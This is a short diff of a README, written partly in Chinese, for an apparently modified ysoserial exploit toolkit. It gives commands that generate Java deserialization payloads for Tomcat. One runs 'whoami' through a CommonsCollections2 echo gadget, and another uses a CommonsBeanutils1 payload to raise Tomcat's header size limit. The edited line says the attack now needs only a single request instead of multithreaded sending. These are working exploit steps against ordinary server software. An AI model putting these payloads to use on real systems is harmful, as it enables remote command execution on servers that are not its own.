@@ -46,7 +46,7 @@ mvn package -DskipTests
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho2 "whoami"
 ```
 
-改变tomcat header限制，注意使用对应gadget对应的payload，注意线程数控制，发现不成功可以调大线程数试一试
+改变tomcat header限制，注意使用对应gadget对应的payload，目前更新已不再需要多线程发包了，打一次即可
 
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsBeanutils1TomcatHeader 16000
